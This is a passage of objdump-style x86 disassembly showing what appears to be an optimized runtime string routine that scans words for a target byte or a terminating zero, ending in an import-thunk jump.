  408036:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  40803c:	75 1c                	jne    0x40805a
  40803e:	25 00 01 01 81       	and    $0x81010100,%eax
  408043:	74 d3                	je     0x408018
  408045:	25 00 01 01 01       	and    $0x1010100,%eax
  40804a:	75 08                	jne    0x408054
  40804c:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  408052:	75 c4                	jne    0x408018
  408054:	5e                   	pop    %esi
  408055:	5f                   	pop    %edi
  408056:	5b                   	pop    %ebx
  408057:	33 c0                	xor    %eax,%eax
  408059:	c3                   	ret
  40805a:	8b 42 fc             	mov    -0x4(%edx),%eax
  40805d:	3a c3                	cmp    %bl,%al
  40805f:	74 36                	je     0x408097
  408061:	84 c0                	test   %al,%al
  408063:	74 ef                	je     0x408054
  408065:	3a e3                	cmp    %bl,%ah
  408067:	74 27                	je     0x408090
  408069:	84 e4                	test   %ah,%ah
  40806b:	74 e7                	je     0x408054
  40806d:	c1 e8 10             	shr    $0x10,%eax
  408070:	3a c3                	cmp    %bl,%al
  408072:	74 15                	je     0x408089
  408074:	84 c0                	test   %al,%al
  408076:	74 dc                	je     0x408054
  408078:	3a e3                	cmp    %bl,%ah
  40807a:	74 06                	je     0x408082
  40807c:	84 e4                	test   %ah,%ah
  40807e:	74 d4                	je     0x408054
  408080:	eb 96                	jmp    0x408018
  408082:	5e                   	pop    %esi
  408083:	5f                   	pop    %edi
  408084:	8d 42 ff             	lea    -0x1(%edx),%eax
  408087:	5b                   	pop    %ebx
  408088:	c3                   	ret
  408089:	8d 42 fe             	lea    -0x2(%edx),%eax
  40808c:	5e                   	pop    %esi
  40808d:	5f                   	pop    %edi
  40808e:	5b                   	pop    %ebx
  40808f:	c3                   	ret
  408090:	8d 42 fd             	lea    -0x3(%edx),%eax
  408093:	5e                   	pop    %esi
  408094:	5f                   	pop    %edi
  408095:	5b                   	pop    %ebx
  408096:	c3                   	ret
  408097:	8d 42 fc             	lea    -0x4(%edx),%eax
  40809a:	5e                   	pop    %esi
  40809b:	5f                   	pop    %edi
  40809c:	5b                   	pop    %ebx
  40809d:	c3                   	ret
  40809e:	ff 25 7c 90 40 00    	jmp    *0x40907c
